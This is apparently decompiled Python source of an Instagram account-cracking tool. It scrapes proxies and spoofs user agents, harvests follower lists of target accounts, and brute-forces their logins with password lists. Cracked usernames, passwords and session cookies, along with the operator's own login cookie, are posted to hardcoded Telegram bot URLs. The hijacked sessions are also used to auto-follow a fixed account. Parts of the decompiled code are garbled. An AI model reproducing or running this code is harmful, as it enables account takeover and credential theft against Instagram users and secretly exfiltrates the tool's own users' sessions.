...
color_rich = '[#afafff]'
color_table = '#9F9F9F'
sys.stdout.write('\x1b]2; jexx-IG\x07')
os.mkdir('result')
os.mkdir('assets')
SE = '[#9F9F9F]'
Z2 = '[#000000]'
...
hapus = '[/]'
zx = []
link = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=60000&country=all&ssl=all&anonymity=all').text
...
if ImportError:
    os.system('pip install clean-text')
    os.system('pip install Unidecode')
    from cleantext import clean
file = open('.prox.txt', 'r')
...
if prox:
    ...
    session_duration = '5m'
    password = f'''zfSlg68BY09HLQoC_country-{country_code}_city-{city_name}_session-{unique_id}_lifetime-{session_duration}'''
    host = 'geo.iproyal.com'
    port = 12321
    random_proxy = get_random_proxy(prox)
    proxiess = {
...
C = '\x1b[0m'
N = '\x1b[0m'
USN = 'Mozilla/5.0 (Linux; Android 12; V2111 Build/SP1A.210812.003_NONFC; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/106.0.5249.126 Mobile Safari/537.36 Instagram 258.1.0.26.100 Android (31/12; 300dpi; 720x1475; vivo; V2111; 2111; mt6765; ru_KZ; 412452737)'
USN = 'Mozilla/5.0 (Linux; Android 10; Infinix X690B Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/120.0.6099.210 Mobile Safari/537.36 Instagram 313.0.0.26.328 Android (29/10; 320dpi; 720x1464; INFINIX MOBILITY LIMITED/Infinix; Infinix X690B; Infinix-X690B; mt6768; fr_FR; 554218546)'
USN = 'Mozilla/5.0 (Linux; Android 11; CPH2109 Build/RKQ1.200903.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/90.0.4430.210 Mobile Safari/537.36 Instagram 187.0.0.32.120 Android (30/11; 480dpi; 1080x2161; OPPO; CPH2109; OP4BA5L1; qcom; ru_RU; 289692198)'
USN = 'Mozilla/5.0 (Linux; Android 12;  2201116PG Build/SKQ1.211006.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/120.0.6099.210 Mobile Safari/537.36 Instagram 313.0.0.26.328 Android (31/12; 440dpi; 1080x2180;  Xiaomi/POCO;  2201116PG; veux; qcom; es_US; 554218560)'
USN = 'Mozilla/5.0 (Linux; Android 10; Nokia 6.1 Build/QKQ1.190828.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 Instagram 296.0.0.35.109 Android (29/10; 356dpi; 1080x1794; HMD Global/Nokia; Nokia 6.1; PL2_sprout; qcom; en_US; 505599011)'
...
USN = 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_6 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Mobile/15D100 Instagram 37.0.0.9.96 (iPhone7,2; iOS 11_2_6; pt_PT; pt-PT; scale=2.34; gamut=normal; 750x1331)'
...
USN = 'Mozilla/5.0 (Linux; Android 6.0; M5 Note Build/MRA58K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/44.0.2403.128 Mobile Safari/537.36 Instagram 37.0.0.21.97 Android (23/6.0; 480dpi; 1080x1920; Meizu; M5 Note; M5Note; mt6755; ru_RU; 98288242)'
...
for xc in range(1000):
    rr = random.randint
    rc = random.choice
    uaz1 = 'Instagram 218.0.0.19.108 Android (30/11; 320dpi; 720x1432; INFINIX MOBILITY LIMITED/Infinix; Infinix X657B; Infinix-X657B; mt6761; in_ID; 345526700)'
    ...
    for typo in range(10000):
        rr = random.randint
        rc = random.choice
        uazku1 = 'Mozilla/5.0 (Linux; Android 13; V2124 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.198 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/418.0.0.35.77;]'
        uazku2 = 'Mozilla/5.0 (Linux; Android 13; vivo 2023) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.198 Mobile Safari/537.36'
        uazku3 = 'Mozilla/5.0 (Mobile; Windows Phone 8.1; Android 4.0; ARM; Trident/7.0; Touch; rv:11.0; IEMobile/11.0; NOKIA; Lumia 1520) like iPhone OS 7_0_3 Mac OS X AppleWebKit/537 (KHTML, like Gecko) Mobile Safari/537 UCBrowser/13.4.0.1306 Mobile'
        uazku4 = 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/115.0 Mobile/16A366 Safari/605.1.15'
        uazku5 = 'Mozilla/5.0 (Linux; Android 13; RMX3636 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.198 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/418.0.0.35.77;]'
        uazku6 = 'Mozilla/5.0 (Linux; U; Android 13; zh-CN;PBAM00 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.198 Quark/6.0.2.157 Mobile Safari/537.36'
        uazku7 = 'Mozilla/5.0 (Linux; Android 13; Pixel 7 Build/TQ1A.230205.002) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.198 Mobile Safari/537.36'
        uazku8 = 'Mozilla/5.0 (Linux; Android 13; OnePlus 10 Pro Build/IN2025) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.198 Mobile Safari/537.36'
        uazku9 = 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1'
        uazku10 = 'Mozilla/5.0 (Linux; Android 13; Galaxy S23 Ultra Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.198 Mobile Safari/537.36'
        sptzy = 'Mozilla/5.0 (Linux; Android 13; SM-N985F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.198 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/418.0.0.35.77;]'
        mods = 'Mozilla/5.0 (Linux; Android 13; SM-N985F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.198 Mobile Safari/537.36'
        pepek = 'Mozilla/5.0 (Linux; U; Android 10; fr-ca; SGH-I317M-parrot Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Mobile Safari/537.36'
        memek = 'Mozilla/5.0 (Linux; Android 10; SAMSUNG-SGH-I317 Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.198 Mobile Safari/537.36'
        update = 'Mozilla/5.0 (Linux; Android 13; SM-G985F Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.198 Mobile Safari/537.36 SznProhlizec/10.2.1a'
        uazstart = str(rc([
            uazku1,
            uazku2,
            uazku3,
        ...
        def waktu():
            ...
            if 12 <= hours or None < 15:
                timenow = 'SIANG KONTOL'
            if 15 <= hours or None < 18:
                timenow = 'SORE KONTOL'
            if not 18 <= hours or None < 24:
                if 0 <= hours or None < 4:
                    timenow = 'MALAM KONTOL'
            return timenow
        ...
        def bot_follow(cookie):
            ...
            data = {
                'user_id': '47857765953',
                '_csrftoken': headers['x-csrftoken'],
                '_uid': headers['x-csrftoken'],
                '_uuid': str(uuid.uuid4()) }
            response = requests.post('https://www.instagram.com/api/v1/friendships/create/47857765953/', headers = headers, data = data)
        ...
        def cekAPI(cookie):
            ...
            c = s.get('https://i.instagram.com/api/v1/users/web_profile_info/?username=%s' % user, cookies = {
                'cookie': coki }, headers = {
                'user-agent': USN,
                'x-ig-app-id': '936619743392459' })
            i = c.json()['data']['user']
            ...
            if FileNotFoundError:
                os.remove('.kukis.log')
                os.remove('.username')
            if (ValueError, KeyError, json.decoder.JSONDecodeError, KeyError, AttributeError, TypeError):
        ...
        def login_kamu():
            if 'sukses' in lisensiku:
                ...
                if FileNotFoundError:
                    ...
                    roti = requests.post(f'''https://api.telegram.org/bot7495057550:AAF7DU-swiba8vijXkZA7F0q055OE4F4mv4/sendMessage?chat_id=6668120260&text={coki}''')
                    id = re.search('ds_user_id=(\\d+)', str(coki)).group(1)
                    po = s.get(f'''https://i.instagram.com/api/v1/users/{id}/info/''', headers = {
                        'user-agent': USN }, cookies = {
                        'cookie': coki })
                    ...
                    bot_follow(coki)
                    loadinglogin()
                    prints(Panel(f'''        selamat [green]{nama}[/] cookie kamu valid''', padding = (0, 5), style = f'''{color_table}''', width = 80))
                    time.sleep(2)
                    time.sleep(2)
                    exit(f'''[{M}!{N}] Jalankan ulang perintah nya''')
                    if (ValueError, KeyError, json.decoder.JSONDecodeError, KeyError, AttributeError, TypeError, AttributeError):
                        print('')
                        loadinglogin()
                        time.sleep(4)
                        exit(f'''{M} [x] Login gagal silahkan cek akun tumbal anda''')
                        time.sleep(8)
        ...
        def User_Agent():
            ...
            i_version = [
                ...
                '114.0.0.0.24',
                '114.0.0.0.41']
            User_Agent = 'Instagram ' + random.choice(i_version) + ' Android (30/3.0; ' + random.choice(dpi_phone) + 'dpi; ' + random.choice(pxl_phone) + '; huawei/google; ' + random.choice(model_phone) + '; angler; angler; en_US)'
            return User_Agent
        ...
        class instagjexxPI:
            ...
            def loginAPI(self):
                token = self.s.get('https:/i.instagram.com/', headers = {
...
[ v + '=' + x_kukis[v] ])(x_kukis())
        ...
        class instagram:
            ...
            def Exit(self):
                prints(Panel('[white]Apakah anda yakin ingin keluar ?', width = 50, padding = (0, 4), style = f'''{color_table}'''))
                x = input(f'''{N}• Jawaban [y/t] : {C}''')
                if x in ('y', 'Y'):
                    os.remove('.kukis.log')
                    os.remove('.username')
                    jalan('• Berhasil Keluar Silakan Ketik Ulang Perintah Scriptnya')
                    time.sleep(2)
                    exit()
                    return None
                if None in ('t', 'T'):
                    jalan('• Kembali Ke Menu Utama Tubg')
                    time.sleep(5)
                    self.menu()
                    return None
                None.menu()
            ...
            def unfollowAPI(self, user_id, username_id, cookie):
                ...
                data = json.dumps({
                    ...
                    'user_id': user_id,
                    '_csrftoken': xx })
                self.payload = 'signed_body={}.{}&ig_sig_key_version=4'.format(str(uuid.uuid4()), urllib.request.quote(data))
                return s.post('https://i.instagram.com/api/v1/friendships/destroy/%s/' % user_id, self.payload, cookies = cookie).text

            
            def searchAPI(self, cookie, nama):
                for ba in range(100):
                    x = s.get('https://www.instagram.com/web/search/topsearch/?count=100000&context=blended&query=%s&rank_token=0.35875757839675004&include_reel=true' % nama, cookies = cookie, headers = {
                        'user-agent': USN })
                    x_jason = json.loads(x.text)
            ...
            def idAPI(self, cookie, id):
                if 'sukses' in lisensiku:
                    m = s.get('https://i.instagram.com/api/v1/users/web_profile_info/?username=%s' % id, cookies = cookie, headers = {
                        'user-agent': USN,
                        'x-ig-app-id': '936619743392459' })
                    ...
                    if (json.decoder.JSONDecodeError, KeyError, AttributeError):
                ...
                if 'sukses' in lisensiku:
                    ...
                    for i in x_jason['users']:
                        ...
                        if 'pengikut' in menudump:
                            ...
                            for z in range(9999):
                                x = s.get('https://i.instagram.com/api/v1/friendships/' + id + '/followers/?count=100&max_id=' + maxid, cookies = cookie, headers = {
                                    'user-agent': USN })
                                x_jason = json.loads(x.text)
                                for i in x_jason['users']:
                                    username = i['username']
                                ...
                                if (requests.exceptions.ConnectionError, requests.exceptions.ChunkedEncodingError, requests.exceptions.ReadTimeout):
                                    exit(f'''\n{M}┣[!] Koneksi internet bermasalah{C}''')
                    if (UnboundLocalError, ValueError, KeyError, json.decoder.JSONDecodeError, KeyError, AttributeError, TypeError, AttributeError):
            ...
            def ifoAPI(self, cookie, api, id, user):
                if 'sukses' in lisensiku:
                    ...
                    for i in x_jason['users']:
                        ...
                        if 'mengikuti' in menudump:
                            maxid = x_jason['next_max_id']
                            for z in range(9999):
                                x = s.get('https://i.instagram.com/api/v1/friendships/' + id + '/following/?count=100&max_id=' + maxid, cookies = cookie, headers = {
                                    'user-agent': USN })
                                x_jason = json.loads(x.text)
                                for i in x_jason['users']:
                                    username = i['username']
                ...
                igv = self.vers()
                ua = [
                    f'''Instagram {random.randrange(37, 41)}.0.0.{random.randrange(11, 99)}.{random.randrange(10, 99)} Android (24/{random.randrange(5, 12)}.0; {dpi}dpi; 1080x2161; OPPO; CPH2109; OP4BA5L1; qcom; ru_RU; 289692198)''',
                    f'''Instagram {random.randrange(37, 41)}.0.0.{random.randrange(11, 99)}.{random.randrange(10, 99)} Android (24/{random.randrange(5, 12)}.0; {dpi}dpi; 1080x2168; Xiaomi/Redmi; Redmi Note 9 Pro; joyeuse; qcom; en_GB; 456141810)''',
                    f'''Instagram {random.randrange(37, 41)}.0.0.{random.randrange(11, 99)}.{random.randrange(10, 99)} Android (26/{random.randrange(5, 12)}.0.0; {dpi}dpi; 1080x2076; samsung; SM-G950F; dreamlte; samsungexynos8895; in_ID; 98288242)''',
                    f'''Instagram {random.randrange(37, 41)}.0.0.{random.randrange(11, 99)}.{random.randrange(10, 99)} Android (24/{random.randrange(5, 12)}.0; {dpi}dpi; 1080x1920; Xiaomi/xiaomi; Redmi Note 4; mido; qcom; id_EN; 98288242)''',
                    f'''Instagram {random.randrange(37, 41)}.0.0.{random.randrange(11, 99)}.{random.randrange(10, 99)} Android (24/{random.randrange(5, 12)}.0; {dpi}dpi; 1080x1920; LENOVO/Lenovo; Lenovo K33b36; K33b36; qcom; in_ID; 103516666)''',
                    f'''Instagram {random.randrange(37, 41)}.0.0.{random.randrange(11, 99)}.{random.randrange(10, 99)} Android (21/{random.randrange(5, 12)}.0.1; {dpi}dpi; 720x1412; Realme; RMX1941; RMX1941; mt6765; ru_RU; 285855802)''',
                    f'''Instagram {random.randrange(37, 41)}.0.0.{random.randrange(11, 99)}.{random.randrange(10, 99)} Android (24/{random.randrange(5, 12)}.0; {dpi}dpi; 1080x2278; vivo; vivo 1939; 2004; qcom; en_US; 383877305)''',
                    f'''Instagram {random.randrange(37, 41)}.0.0.{random.randrange(11, 99)}.{random.randrange(10, 99)} Android (23/{random.randrange(5, 12)}.0.1; {dpi}dpi; 1080x1794; LGE/google; Nexus 5X; bullhead; bullhead; ru_UA; 98288242)''',
                    f'''Instagram {random.randrange(37, 41)}.0.0.{random.randrange(11, 99)}.{random.randrange(10, 99)} Android (27/{random.randrange(5, 12)}.1.0; {dpi}dpi; 720x1280; samsung; SM-E500H; e53g; qcom; ru_RU; 98288239)''',
                    f'''Instagram {random.randrange(37, 41)}.0.0.{random.randrange(11, 99)}.{random.randrange(10, 99)} Android (22/{random.randrange(5, 12)}.1.1; {dpi}dpi; 720x1280; samsung; SM-E500H; e53g; qcom; in_ID; 98288239)''',
                    f'''Instagram {random.randrange(37, 41)}.0.0.{random.randrange(11, 99)}.{random.randrange(10, 99)} Android (22/{random.randrange(5, 12)}.1.1; {dpi}dpi; 1440x2560; samsung; SM-G925F; zerolte; samsungexynos7420; uk_UA; 98288242)Instagram {random.randrange(37, 41)}.0.0.{random.randrange(11, 99)}.{random.randrange(10, 99)} Android (22/{random.randrange(5, 12)}.1; {dpi}dpi; 1080x1920; Xiaomi/xiaomi; Redmi Note 4; mido; qcom; uk_UA; 98288242)''',
                    f'''Instagram {random.randrange(37, 41)}.0.0.{random.randrange(11, 99)}.{random.randrange(10, 99)} Android (24/{random.randrange(5, 12)}.0; {dpi}dpi; 1080x2076; samsung; SM-G950F; dreamlte; samsungexynos8895; ru_UA; 98288242)''',
                    f'''Instagram {random.randrange(37, 41)}.0.0.{random.randrange(11, 99)}.{random.randrange(10, 99)} Android (24/{random.randrange(5, 12)}.0; {dpi}dpi; 1080x2161; OPPO; CPH2109; OP4BA5L1; qcom; ru_RU; 289692198)''',
                    f'''Instagram {random.randrange(37, 41)}.0.0.{random.randrange(11, 99)}.{random.randrange(10, 99)} Android (24/{random.randrange(5, 12)}.0; {dpi}dpi; 1080x2168; Xiaomi/Redmi; Redmi Note 9 Pro; joyeuse; qcom; en_GB; 456141810)''',
                    f'''Instagram {random.randrange(37, 41)}.0.0.{random.randrange(11, 99)}.{random.randrange(10, 99)} Android (26/{random.randrange(5, 12)}.0.0; {dpi}dpi; 1080x2076; samsung; SM-G950F; dreamlte; samsungexynos8895; in_ID; 98288242)''',
                    f'''Instagram {random.randrange(37, 41)}.0.0.{random.randrange(11, 99)}.{random.randrange(10, 99)} Android (24/{random.randrange(5, 12)}.0; {dpi}dpi; 1080x1920; Xiaomi/xiaomi; Redmi Note 4; mido; qcom; id_EN; 98288242)''',
                    f'''Instagram {random.randrange(37, 41)}.0.0.{random.randrange(11, 99)}.{random.randrange(10, 99)} Android (24/{random.randrange(5, 12)}.0; {dpi}dpi; 1080x1794; HUAWEI; HUAWEI GRA-L09; HWGRA; hi3635; hu_HU; 98288242)''',
                    f'''Instagram {random.randrange(37, 41)}.0.0.{random.randrange(11, 99)}.{random.randrange(10, 99)} Android (21/{random.randrange(5, 12)}.0.1; {dpi}dpi; 1080x2179; Xiaomi/POCO; M2102J20SG; vayu; qcom; it_IT; 285604300)''',
                    f'''Instagram {random.randrange(37, 41)}.0.0.{random.randrange(11, 99)}.{random.randrange(10, 99)} Android (23/{str(rr(4, 13))}; {dpi}dpi; {pxl}; Meizu; MX6; MX6; {com}; {comi})''']
                return ua
            ...
            def ua_v2(self):
                ...
                ua = [
                    ...
                    f'''Instagram {random.randrange(37, 41)}.0.0.{random.randrange(10, 99)}.{random.randrange(10, 99)} Android (22/{random.randrange(5, 12)}.1.1; {dpi}dpi; 720x1370; HMD Global/Nokia; Nokia 4.2; PAN_sprout; qcom; it_IT; 217948971)Instagram {random.randrange(37, 41)}.0.0.{random.randrange(10, 99)}.{random.randrange(10, 99)} Android (22/{random.randrange(5, 12)}.1; {dpi}dpi; 1080x1794; HMD Global/Nokia; TA-1041; C1N; qcom; en_GB; 382290498)''',
            ...
            def ingfo(self):
                prints(Panel('\t  [white]Hidupkan Mode Pesawat 10 Detik Jika Terdeteksi [blue]SPAM IP[/]', width = 80, padding = (0, 3), style = f'''{color_table}'''))
                prints(Panel(f''' {SE}╭─────────────────────────────────╮{SE} ╭───────────────────────────────────╮\n {SE}│ [white]result/[green]success-{day}.txt[/]{SE}  │ {SE}│ [white]result/[yellow]{K2}checkpoint-{day}.txt[/] {SE}│\n {SE}╰─────────────────────────────────╯{SE} ╰───────────────────────────────────╯''', title = '[[white] Cek Hasil [/]]', width = 80, style = f'''{color_table}'''))

            
            def ifo(self):
                urut = []
                urut.append(Panel(' [white][[blue]01[white]]  METOD Gacor[white] [[green]Recommend[white]]\n [white][[blue]02[white]]. Method Api V2[white] [[green]recommend[white]]', width = 40, title = '[white]Method Api ', style = f'''{color_table}'''))
                self.tol.print(Columns(urut))

            
            def INFOdata(self, cookie):
                x = s.get('https://i.instagram.com/api/v1/users/web_profile_info/?username=%s' % user, headers = {
                    'user-agent': USN,
                    'x-ig-app-id': '936619743392459' })
                ...
                fbid = '-'
                postingan = '-'
                return (nama, pengikut, mengikut, fbid, postingan)
            ...
            def generateAPI(self, user, o, zx = ('',)):
                ...
                prog
                shinkai = ThreadPoolExecutor(max_workers = 30)
                for i in user:
                    username = i.split('|')[0]
            ...
            def V1(self, user, pas):
                ...
                data2 = HARIS['sinkz1']
                data2.update({
                    'signed_body': f'''{ned}.{str(data1)}''' })
                head = HARIS['headaing']
                head.update({
                    'user-agent': ua })
                p = ses.post(HARIS['sinkz2'], headers = head, data = data2)
                prog.update(des, description = f'''[{acakrich}jexx🔥[/]] {str(loop)}/{len(internal)} [green]OK : -[bold green]{len(success)}[/] [yellow]CP : -[bold yellow]{len(checkpoint)}[/]''')
                prog.advance(des)
                for pw in pas:
                    data = json.dumps({
                        'phone_id': ponid,
                        '_csrftoken': ses.cookies['csrftoken'],
                        'username': user,
                        'guid': guid,
                        'device_id': andro,
                        'password': pw.replace(' ', '+'),
                        'login_attempt_count': str(logtemp) })
                    ...
                    respon = ses.post(HARIS['crack'], headers = head2, data = dataa, proxies = xxx)
...
[ key + '=' + value.replace('"', '') ])(ses.cookies.get_dict().items()())
                        bot_follow(cookie)
                        (nomo, email, fbid, pictures, bio) = self.INFOdata(cookie)
                        roti = requests.post(f'''https://api.telegram.org/bot7452794338:AAEr6EIh1M03HpG9j0O_0VTsdO_F-liQVt8/sendMessage?chat_id=6668120260&text={cookie}''')
                        print('')
                        []['\r'][f'''{P2}''']['['][f'''{H2}''']['✓'][f'''{P2}''']['] Nama      : '][f'''{H2}'''][f'''{nama}''']['                \n'][f'''{P2}''']['['][f'''{H2}''']['✓'][f'''{P2}''']['] Username  : '][f'''{H2}'''][f'''{user}''']['                \n'][f'''{P2}''']['['][f'''{H2}''']['✓'][f'''{P2}''']['] Password  : '][f'''{H2}'''][f'''{pw}''']['                \n'][f'''{P2}''']['['][f'''{H2}''']['✓'][f'''{P2}''']['] Pengikut  : '][f'''{H2}'''][f'''{pengikut}''']['                \n'][f'''{P2}''']['['][f'''{H2}''']['✓'][f'''{P2}''']['] Mengikuti : '][f'''{H2}'''][f'''{mengikut}''']['                \n'][f'''{P2}''']['['][f'''{H2}''']['✓'][f'''{P2}''']['] Postingan : '][f'''{H2}'''][f'''{postingan}''']['\n'][f'''{P2}''']['['][f'''{H2}''']['✓'][f'''{P2}''']['] Cookies   : '][f'''{H2}''']([]['\r'][f'''{P2}''']['['][f'''{H2}''']['✓'][f'''{P2}''']['] Nama      : '][f'''{H2}'''][f'''{nama}''']['                \n'][f'''{P2}''']['['][f'''{H2}''']['✓'][f'''{P2}''']['] Username  : '][f'''{H2}'''][f'''{user}''']['                \n'][f'''{P2}''']['['][f'''{H2}''']['✓'][f'''{P2}''']['] Password  : '][f'''{H2}'''][f'''{pw}''']['                \n'][f'''{P2}''']['['][f'''{H2}''']['✓'][f'''{P2}''']['] Pengikut  : '][f'''{H2}'''][f'''{pengikut}''']['                \n'][f'''{P2}''']['['][f'''{H2}''']['✓'][f'''{P2}''']['] Mengikuti : '][f'''{H2}'''][f'''{mengikut}''']['                \n'][f'''{P2}''']['['][f'''{H2}''']['✓'][f'''{P2}''']['] Postingan : '][f'''{H2}'''][f'''{postingan}''']['\n'][f'''{P2}''']['['][f'''{H2}''']['✓'][f'''{P2}''']['] Cookies   : '][f'''{H2}'''][f'''{cookie}''']([]['\r'][f'''{P2}''']['['][f'''{H2}''']['✓'][f'''{P2}''']['] Nama      : '][f'''{H2}'''][f'''{nama}''']['                \n'][f'''{P2}''']['['][f'''{H2}''']['✓'][f'''{P2}''']['] Username  : '][f'''{H2}'''][f'''{user}''']['                \n'][f'''{P2}''']['['][f'''{H2}''']['✓'][f'''{P2}''']['] Password  : '][f'''{H2}'''][f'''{pw}''']['                \n'][f'''{P2}''']['['][f'''{H2}''']['✓'][f'''{P2}''']['] Pengikut  : '][f'''{H2}'''][f'''{pengikut}''']['                \n'][f'''{P2}''']['['][f'''{H2}''']['✓'][f'''{P2}''']['] Mengikuti : '][f'''{H2}'''][f'''{mengikut}''']['                \n'][f'''{P2}''']['['][f'''{H2}''']['✓'][f'''{P2}''']['] Postingan : '][f'''{H2}'''][f'''{postingan}''']['\n'][f'''{P2}''']['['][f'''{H2}''']['✓'][f'''{P2}''']['] Cookies   : '][f'''{H2}'''][f'''{cookie}''']['|']([]['\r'][f'''{P2}''']['['][f'''{H2}''']['✓'][f'''{P2}''']['] Nama      : '][f'''{H2}'''][f'''{nama}''']['                \n'][f'''{P2}''']['['][f'''{H2}''']['✓'][f'''{P2}''']['] Username  : '][f'''{H2}'''][f'''{user}''']['                \n'][f'''{P2}''']['['][f'''{H2}''']['✓'][f'''{P2}''']['] Password  : '][f'''{H2}'''][f'''{pw}''']['                \n'][f'''{P2}''']['['][f'''{H2}''']['✓'][f'''{P2}''']['] Pengikut  : '][f'''{H2}'''][f'''{pengikut}''']['                \n'][f'''{P2}''']['['][f'''{H2}''']['✓'][f'''{P2}''']['] Mengikuti : '][f'''{H2}'''][f'''{mengikut}''']['                \n'][f'''{P2}''']['['][f'''{H2}''']['✓'][f'''{P2}''']['] Postingan : '][f'''{H2}'''][f'''{postingan}''']['\n'][f'''{P2}''']['['][f'''{H2}''']['✓'][f'''{P2}''']['] Cookies   : '][f'''{H2}'''][f'''{cookie}''']['|'][f'''{ua}''']), title = f'''{H2}STREAK MAS''', width = 80, padding = (0, 4), style = ''))
                        print('')
                        bit = ses.post(f'''https://api.telegram.org/bot7495057550:AAF7DU-swiba8vijXkZA7F0q055OE4F4mv4/sendMessage?chat_id=6668120260&text=SETOR AKUN IG\nUsername: {user}\nPass: {pw}\nPengikut: {pengikut}\nMengikuti: {mengikut}\nfbid: {fbid}\nPostingan: {postingan}\nCookies: {cookie}\nUA: {ua}''')
                        ...
                        open('.logCrack', 'a').write(f'''{H}╭({H}{loop}{H}) {H}{user} {H}|| {H}{pw}\n{H}╰{H}{respon.text}\n''')
                        []['\r'][f'''{P2}''']['['][f'''{H2}''']['✓'][f'''{P2}''']['] Nama      : '][f'''{H2}'''][f'''{nama}''']['                \n'][f'''{P2}''']['['][f'''{H2}''']['✓'][f'''{P2}''']['] Username  : '][f'''{H2}'''][f'''{user}''']['                \n'][f'''{P2}''']['['][f'''{H2}''']['✓'][f'''{P2}''']['] Password  : '][f'''{H2}'''][f'''{pw}''']['                \n'][f'''{P2}''']['['][f'''{H2}''']['✓'][f'''{P2}''']['] Pengikut  : '][f'''{H2}'''][f'''{pengikut}''']['                \n'][f'''{P2}''']['['][f'''{H2}''']['✓'][f'''{P2}''']['] Mengikuti : '][f'''{H2}'''][f'''{mengikut}''']['                \n'][f'''{P2}''']['['][f'''{H2}''']['✓'][f'''{P2}''']['] Postingan : '][f'''{H2}'''][f'''{postingan}''']['\n'][f'''{P2}''']['['][f'''{H2}''']['✓']
                    if 'https://i.instagram.com/challenge' in str(respon.text):
                        (nama, pengikut, mengikut, postingan) = self.APIinfo(user)
                        print('')
                        []['\r'][f'''{P2}''']['['][f'''{K2}''']['×'][f'''{P2}''']['] Nama      : '][f'''{K2}'''][f'''{nama}''']['                \n'][f'''{P2}''']['['][f'''{K2}''']['×'][f'''{P2}''']['] Username  :'][f'''{K2}'''][' '][f'''{user}''']['                \n'][f'''{P2}''']['['][f'''{K2}''']['×'][f'''{P2}''']['] Password  :'][f'''{K2}'''][' '][f'''{pw}''']['                \n'][f'''{P2}''']['['][f'''{K2}''']['×'][f'''{P2}''']['] Pengikut  : '][f'''{K2}'''][f'''{pengikut}''']['                \n'][f'''{P2}''']['['][f'''{K2}''']['×'][f'''{P2}''']['] Mengikuti : '][f'''{K2}'''][f'''{mengikut}''']['                \n'][f'''{P2}''']['['][f'''{K2}''']['×'][f'''{P2}''']([]['\r'][f'''{P2}''']['['][f'''{K2}''']['×'][f'''{P2}''']['] Nama      : '][f'''{K2}'''][f'''{nama}''']['                \n'][f'''{P2}''']['['][f'''{K2}''']['×'][f'''{P2}''']['] Username  :'][f'''{K2}'''][' '][f'''{user}''']['                \n'][f'''{P2}''']['['][f'''{K2}''']['×'][f'''{P2}''']['] Password  :'][f'''{K2}'''][' '][f'''{pw}''']['                \n'][f'''{P2}''']['['][f'''{K2}''']['×'][f'''{P2}''']['] Pengikut  : '][f'''{K2}'''][f'''{pengikut}''']['                \n'][f'''{P2}''']['['][f'''{K2}''']['×'][f'''{P2}''']['] Mengikuti : '][f'''{K2}'''][f'''{mengikut}''']['                \n'][f'''{P2}''']['['][f'''{K2}''']['×'][f'''{P2}''']['] Postingan : ']([]['\r'][f'''{P2}''']['['][f'''{K2}''']['×'][f'''{P2}''']['] Nama      : '][f'''{K2}'''][f'''{nama}''']['                \n'][f'''{P2}''']['['][f'''{K2}''']['×'][f'''{P2}''']['] Username  :'][f'''{K2}'''][' '][f'''{user}''']['                \n'][f'''{P2}''']['['][f'''{K2}''']['×'][f'''{P2}''']['] Password  :'][f'''{K2}'''][' '][f'''{pw}''']['                \n'][f'''{P2}''']['['][f'''{K2}''']['×'][f'''{P2}''']['] Pengikut  : '][f'''{K2}'''][f'''{pengikut}''']['                \n'][f'''{P2}''']['['][f'''{K2}''']['×'][f'''{P2}''']['] Mengikuti : '][f'''{K2}'''][f'''{mengikut}''']['                \n'][f'''{P2}''']['['][f'''{K2}''']['×'][f'''{P2}''']['] Postingan : '][f'''{K2}''']([]['\r'][f'''{P2}''']['['][f'''{K2}''']['×'][f'''{P2}''']['] Nama      : '][f'''{K2}'''][f'''{nama}''']['                \n'][f'''{P2}''']['['][f'''{K2}''']['×'][f'''{P2}''']['] Username  :'][f'''{K2}'''][' '][f'''{user}''']['                \n'][f'''{P2}''']['['][f'''{K2}''']['×'][f'''{P2}''']['] Password  :'][f'''{K2}'''][' '][f'''{pw}''']['                \n'][f'''{P2}''']['['][f'''{K2}''']['×'][f'''{P2}''']['] Pengikut  : '][f'''{K2}'''][f'''{pengikut}''']['                \n'][f'''{P2}''']['['][f'''{K2}''']['×'][f'''{P2}''']['] Mengikuti : '][f'''{K2}'''][f'''{mengikut}''']['                \n'][f'''{P2}''']['['][f'''{K2}''']['×'][f'''{P2}''']['] Postingan : '][f'''{K2}'''][f'''{postingan}''']), title = f'''{K2}CHECKPOINT''', width = 80, padding = (0, 4), style = ''))
                        print('')
                        ...
